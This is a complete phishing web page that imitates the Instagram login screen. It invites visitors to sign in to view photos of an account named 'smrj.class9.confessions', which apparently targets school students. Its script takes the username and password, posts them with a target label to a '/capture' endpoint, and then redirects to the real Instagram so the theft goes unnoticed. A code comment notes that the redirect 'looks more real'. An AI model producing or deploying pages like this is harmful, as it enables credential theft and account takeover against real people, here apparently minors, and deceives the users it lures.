<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; border: 1px solid #dbdbdb; border-radius: 8px; width: 350px; padding: 40px 20px; text-align: center; }
        .logo { font-size: 40px; font-weight: 600; margin-bottom: 30px; color: #262626; }
        input { width: 100%; padding: 12px; margin: 6px 0; border: 1px solid #dbdbdb; border-radius: 6px; background: #fafafa; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 6px; font-weight: 600; margin-top: 15px; cursor: pointer; }
        button:disabled { background: #b2dffc; }
        .or { margin: 20px 0; color: #8e8e8e; font-size: 14px; }
        .fb { color: #385185; font-weight: 600; text-decoration: none; }
        .forgot { color: #00376b; font-size: 12px; margin-top: 20px; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        
        <p style="color:#8e8e8e; margin-bottom:20px;">Sign in to see photos of<br><strong>smrj.class9.confessions</strong></p>

        <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="off">
        <input type="password" id="password" placeholder="Password">

        <button id="loginBtn">Log in</button>

        <div class="or">OR</div>
        <a href="#" class="fb">Log in with Facebook</a>

        <a href="#" class="forgot">Forgot password?</a>

        <p style="margin-top:30px; font-size:14px;">
            Don't have an account? <a href="#" style="color:#0095f6; text-decoration:none;">Sign up</a>
        </p>
    </div>

    <script>
        const loginBtn = document.getElementById('loginBtn');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');

        loginBtn.addEventListener('click', async () => {
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();

            if (!username || !password) {
                alert("Please fill in both fields");
                return;
            }

            // Disable button and show loading
            loginBtn.textContent = "Logging in...";
            loginBtn.disabled = true;

            const payload = {
                username: username,
                password: password,
                target: "smrj.class9.confessions",
                time: Date.now()
            };

            try {
                const response = await fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                console.log("✅ Data sent to server");
            } catch (err) {
                console.error("❌ Failed to send data:", err);
            }

            // Always redirect after a short delay (looks more real)
            setTimeout(() => {
                window.location.href = "https://www.instagram.com";
            }, 1500);
        });
    </script>
</body>
</html>
